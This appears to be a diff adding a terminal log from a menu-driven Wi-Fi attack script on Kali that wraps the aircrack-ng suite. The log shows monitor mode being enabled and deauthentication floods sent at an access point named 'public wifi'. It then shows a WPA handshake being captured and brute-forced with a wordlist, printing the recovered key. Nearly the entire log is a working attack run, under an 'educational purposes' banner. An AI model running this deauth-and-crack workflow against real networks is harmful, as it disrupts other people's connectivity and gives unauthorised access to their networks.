@@ -1,0 +1,409 @@
+sudo bash mybash.sh         
+
+ROOT PERMISSION GRANTED
+
+**** WELCOME TO NETWORK ANALYZER v2024.06.24 ****
+ !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 
+   This script is only for educational purposes.
+    Use it only with proper permission!
+ !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 
+Detecting System ...
+FOUND: Kali
+
+Checking Requirement...
+
+Checking for aircrack-ng...
+Ok
+ [/]  
+Checking for airmon-ng...
+Ok
+ [/]  
+Checking for airodump-ng...
+Ok
+ [/]  
+Checking for mdk3...
+Ok
+ [/]  
+Checking for mdk4...
+Ok
+ [/]  
+Checking for aireplay-ng...
+Ok
+ [/]  
+
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                                                                   B        
+    ██████████          ██████        ████████████████████         C        
+    ███████████         ██████       ██████████████████████        A        
+    ███████ ████        ██████       ██████         ███████                          
+    ███████  ████       ██████       ██████         ███████     5th         
+    ███████   █████     ██████       ██████         ███████                          
+    ███████    █████    ██████       ██████████████████████     S | 2 |     
+    ███████     █████   ██████       ██████████████████████     E | 0 |     
+    ███████      █████  ██████       ██████         ███████     M | 2 |     
+    ███████       █████ ██████       ██████         ███████       | 4 |     
+    ███████        ███████████       ██████         ███████     P           
+    ███████         ██████████       ██████         ███████     J           
+                                                                                     
+                NETWORK ANALYZER v2024.06.24    - AZ_SEP     
+                        SYSTEM Kali                              
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+ _______________
+|REQUIRED TOOLS:|
+|1. aircrack-ng |
+|2. airmon-ng   |
+|3. airodump-ng |
+|4. aireplay-ng |
+|5. BCA-crack   |
+|_______________|
+
+This tools require ADMIN previlge
+
+WLAN interfaces found: wlan0 
+Starting Python server...
+server.py
+
+Select an option:
+1.  Enable Monitor Mode
+2.  Disable Monitor Mode
+3.  Network Deauthentication
+4.  Capture Handshake
+5.  WiFi Network Encryption Vulnerability Testing
+6.  Network Monitoring
+7.  Anonymous Mode
+8.  Password Cracking (BF & G-crack)
+9. Exit
+
+Ctl + C to exit the process
+Ctl + C to exit the process
+Enter your choice: 1
+
+1. Enable Monitor Mode
+2. Check Network Status
+
+Enter any key to exit to main MENU 
+
+Enter your choice: 1
+ current interfaces is  wlan0
+ Starting Monitoring Mode..
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng check kill' before putting
+the card in monitor mode, they will interfere by changing channels
+and sometimes putting the interface back in managed mode
+
+    PID Name
+    749 NetworkManager
+    847 wpa_supplicant
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlan0		iwlwifi		Intel Corporation Wireless 8265 / 8275 (rev 78)
+		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+		(mac80211 station mode vif disabled for [phy0]wlan0)
+
+
+
+Select an option:
+1.  Enable Monitor Mode
+2.  Disable Monitor Mode
+3.  Network Deauthentication
+4.  Capture Handshake
+5.  WiFi Network Encryption Vulnerability Testing
+6.  Network Monitoring
+7.  Anonymous Mode
+8.  Password Cracking (BF & G-crack)
+9. Exit
+Ctl + C to exit the process
+Enter your choice: 3
+
+This tools required MONITORING MODE
+
+Deauth option:
+1. Discover Network
+2. Manual Mode
+
+Enter any key to exit to main MENU 
+
+Enter your choice: 2
+Entering Manual Mode...
+Enter AP MAC / BSSID address:
+ 66:95:CC:55:F6:EC 
+Enter Channel no.(CH):
+12
+
+ CH 12 ][ Elapsed: 6 s ][ 2024-05-29 03:52 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 66:95:CC:55:F6:EC  -24 100      108        0    0  12  360   WPA2 CCMP   PSK  public wifi                           
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ 66:95:CC:55:F6:EC  E4:70:B8:EA:B5:DC   -1    1e- 0      0        1                                                   
+Quitting...
+ enter target details:
+Enter AP MAC / BSSID address:
+ 66:95:CC:55:F6:EC
+Enter Client MAC / BSSID address:
+ 66:95:CC:55:F6:EC  
+Enter Number of deauthentication
+Enter 0 for auto
+0
+03:53:46  Waiting for beacon frame (BSSID: 66:95:CC:55:F6:EC) on channel 12
+03:53:47  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [124|124 ACKs]
+03:53:47  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [129|129 ACKs]
+03:53:48  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:49  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:49  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:53:50  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:53:50  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:51  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:51  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:52  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:53:52  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:53:53  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:53  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:54  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:55  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:55  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:56  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:53:56  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:57  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:53:57  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [121|121 ACKs]
+03:53:58  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [135|135 ACKs]
+03:53:58  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:53:59  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:00  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:00  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [118|118 ACKs]
+03:54:01  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [126|126 ACKs]
+03:54:01  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:02  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:02  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:03  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:03  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [125|125 ACKs]
+03:54:04  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:05  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [125|125 ACKs]
+03:54:05  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [126|126 ACKs]
+03:54:06  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [129|129 ACKs]
+03:54:06  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [126|126 ACKs]
+03:54:07  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [124|124 ACKs]
+03:54:07  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [126|126 ACKs]
+03:54:08  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [125|125 ACKs]
+03:54:08  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [119|119 ACKs]
+03:54:09  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [134|134 ACKs]
+03:54:10  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:10  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:11  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:11  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:12  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:12  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:13  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [126|126 ACKs]
+03:54:13  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:14  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:15  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:15  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:16  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:16  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:17  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:17  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:18  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:18  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:19  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:19  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [125|125 ACKs]
+03:54:20  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:21  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:21  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:22  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:22  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:23  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:23  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:24  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:24  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:25  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:25  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:26  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:27  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:27  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:28  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:28  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:29  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:29  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:30  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [129|129 ACKs]
+03:54:30  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:31  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:31  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:32  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:32  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:33  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:34  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:34  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:35  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [127|127 ACKs]
+03:54:35  Sending 64 directed DeAuth (code 7). STMAC: [66:95:CC:55:F6:EC] [128|128 ACKs]
+03:54:36  Sending 64 directed DeAu^CIf {monmon} appear after wlan0 Disable Monitor Mode and RESTART
+        or used sudo airodump-ng stop wlan0
+
+Select an option:
+1.  Enable Monitor Mode
+2.  Disable Monitor Mode
+3.  Network Deauthentication
+4.  Capture Handshake
+5.  WiFi Network Encryption Vulnerability Testing
+6.  Network Monitoring
+7.  Anonymous Mode
+8.  Password Cracking (BF & G-crack)
+9. Exit
+Ctl + C to exit the process
+Enter your choice: 4
+
+Entering Capturing Mode..
+1. Manual Mode
+2. Select Available Network
+
+Enter any key to exit to main MENU 
+
+Enter your choice: 1
+Used OPTION 2 To Discover Networks
+
+Enter channel:
+12
+Enter AP MAC / BSSID address:
+ 66:95:CC:55:F6:EC
+Enter output file name (without extension):
+publicwifi
+Enter valid details!
+04:07:45  Created capture file "publicwifi-02.cap".
+
+
+ CH 12 ][ Elapsed: 1 min ][ 2024-05-29 04:09 ][ WPA handshake: 66:95:CC:55:F6:EC 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 66:95:CC:55:F6:EC  -21 100      940      534    0  12  360   WPA2 CCMP   PSK  public wifi                           
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ 66:95:CC:55:F6:EC  E4:70:B8:EA:B5:DC  -19    1e- 1e   126      424  EAPOL                                            
+Quitting...
+If {monmon} appear after wlan0 Disable Monitor Mode and RESTART
+        or used sudo airodump-ng stop wlan0
+\033[0m
+
+Select an option:
+1.  Enable Monitor Mode
+2.  Disable Monitor Mode
+3.  Network Deauthentication
+4.  Capture Handshake
+5.  WiFi Network Encryption Vulnerability Testing
+6.  Network Monitoring
+7.  Anonymous Mode
+8.  Password Cracking (BF & G-crack)
+9. Exit
+
+Ctl + C to exit the process
+Enter your choice: 6
+
+Enter Network Interface(default is: wlan0) 
+6
+This tools required MONITORING MODE
+
+
+ CH  9 ][ Elapsed: 18 s ][ 2024-05-29 04:14 
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 66:95:CC:55:F6:EC  -36       28        0    0  12  360   WPA2 CCMP   PSK  public wifi                               
+ BC:8A:E8:00:11:45  -44       31        0    0   7   65   OPN              192.168.43.177:5000                       
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+Quitting...
+If {monmon} appear after wlan0 Disable Monitor Mode and RESTART
+        or used sudo airodump-ng stop wlan0
+
+Select an option:
+1.  Enable Monitor Mode
+2.  Disable Monitor Mode
+3.  Network Deauthentication
+4.  Capture Handshake
+5.  WiFi Network Encryption Vulnerability Testing
+6.  Network Monitoring
+7.  Anonymous Mode
+8.  Password Cracking (BF & G-crack)
+9. Exit
+
+Ctl + C to exit the process
+Enter your choice: 8
+
+Entering Password cracking...
+Password list is available at /Final/vulnerability/..txt
+1. Brute Force
+2. BCA-cracker
+
+Enter any key to exit to main MENU 
+
+Enter your choice: 1
+Starting Brute Force attack...
+Enter Directory for Handshake File:
+/home/hope/Desktop/Network Analyzer/publicwifi-02.cap
+Enter wordlist file name (including path if not in current directory):
+/home/hope/Desktop/Network Analyzer/public/vulnarability testing/rockyou.txt
+Reading packets, please wait...
+Opening /home/hope/Desktop/Network Analyzer/publicwifi-02.cap
+Opening passwdcracking_out
+Unsupported file format (not a pcap or IVs file).
+Read 1544 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  66:95:CC:55:F6:EC  public wifi               WPA (1 handshake)
+
+Choosing first network as target.
+
+Reading packets, please wait...
+Opening /home/hope/Desktop/Network Analyzer/publicwifi-02.cap
+Opening passwdcracking_out
+Unsupported file format (not a pcap or IVs file).
+Read 1544 packets.
+
+1 potential targets
+
+
+
+                               Aircrack-ng 1.7 
+
+      [00:00:22] 101084/14344392 keys tested (4622.27 k/s) 
+
+      Time left: 51 minutes, 21 seconds                          0.70%
+
+                         KEY FOUND! [ beautifulsoul ]
+
+
+      Master Key     : 22 AE C4 CF 1B DF 12 E9 59 67 F5 80 5E A5 08 33 
+                       55 9B 2A B0 0A 8A 25 39 62 CC 28 B1 7B 41 79 2F 
+
+      Transient Key  : 54 30 4C 83 77 DE 0A 62 42 4A 4F EB 34 61 F0 F8 
+                       9F F9 85 A6 2A 00 BE A1 6B A9 99 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+      EAPOL HMAC     : F6 59 08 96 44 1B BC F8 FC E6 4A DD 14 33 61 0F 
+
+
+-r \033[0m
+
+Select an option:
+1.  Enable Monitor Mode
+2.  Disable Monitor Mode
+3.  Network Deauthentication
+4.  Capture Handshake
+5.  WiFi Network Encryption Vulnerability Testing
+6.  Network Monitoring
+7.  Anonymous Mode
+8.  Password Cracking (BF & G-crack)
+9. Exit
+
+Ctl + C to exit the process
+Enter your choice: 
+
